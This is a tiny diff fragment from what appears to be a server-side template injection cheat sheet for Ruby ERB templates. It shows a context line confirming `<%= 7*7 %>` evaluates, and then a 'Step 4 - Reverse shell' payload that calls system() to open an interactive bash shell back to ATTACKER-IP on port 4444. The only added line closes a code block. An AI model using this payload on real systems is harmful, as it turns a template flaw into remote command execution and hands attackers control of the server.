@@ -303,3 +303,4 @@ Since `<%= 7*7 %>` works, use these next:
 
 # Step 4 - Reverse shell
 <%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") %>
+```
